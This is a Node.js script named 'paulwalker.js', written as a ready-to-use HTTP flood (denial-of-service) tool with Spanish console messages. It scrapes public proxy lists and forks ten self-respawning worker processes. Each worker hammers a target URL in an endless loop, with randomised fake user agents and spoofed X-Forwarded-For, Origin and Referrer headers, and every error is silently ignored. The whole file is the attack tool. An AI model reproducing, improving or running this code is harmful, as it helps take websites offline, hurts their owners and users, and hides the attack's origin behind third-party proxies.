const axios = require('axios');
const fakeUa = require('fake-useragent');
const cluster = require('cluster');
const HttpsProxyAgent = require('https-proxy-agent');
const colors = require("colors");

async function maintenance() {
  if (process.argv.length !== 4){
    console.log("\033\143")
    console.log(" CREADO POR |JORGE KHE MAMADAS|    ".inverse)
    console.log(" https://github.com/jorgekhemamadas".inverse)
    console.log(' node paulwalker.js url tunnelssh  '.underline.green)
    process.exit()
  }


  else{
    if (process.argv[3] == 'raw'){

    }




    else if(process.argv[2] == 'url'){

try {
	const proxyscrape_http = await axios.get(`https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all`);
} catch (error) {
console.log("")
console.log("  error al intentar conectar con el tunnel ssh :(".red)
console.log("")

}

      const proxyscrape_http = await axios.get(`https://www.sslproxies.org/`);
      var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');

    }
    else{

      process.exit()
    }
    function run(){
    if (process.argv[3] == 'raw'){
      var config={
        url: process.argv[2],
        medthod:'get',
        headers:{
            'Cache-Control': 'no-cache',
            'User-Agent': fakeUa()
        }
      }
      axios(config).then(function (re){
        console.log("[Paul Walker] R A W aceptado".green,re.status)
      }).catch(function (error){
        console.log("[Paul Walker] R A W denegado".red,error.response.status)
      })
    }
    else if(process.argv[2] == 'url'){
      let url = proxies[Math.floor(Math.random() * proxies.length)];
      var agent = new HttpsProxyAgent('http://' + url);
 
      var cung={

        url:process.argv[3],
        httpsAgent: agent,
        medthod:'get',

        headers:{
        'User-Agent': fakeUa(),
        'Upgrade-Insecure-Requests': '300',
        'Connection':'Keep-Alive',
        'Keep-Alive': 'timeout=1,max=5',
        'Origin': 'http://' + url,
        'Referrer': 'http://google.com/' + url,
        'X-Forwarded-For': url

        }
      }

      var today = new Date();
      var now = today.toLocaleTimeString('en-US');

      axios(cung).then(function (res){

      }).catch(function (error){

      })
    }

  }

  // body...
}


function time(){
  setInterval(()=>{
    run()
  })
}

async function th(){
  if (cluster.isMaster){
    for (let u=0;u<10;u++){
      cluster.fork()

    }
    cluster.on('exit',function(){
      cluster.fork()
    })
  }
  else{
    time()
  }

}
th()




}






process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});
maintenance()
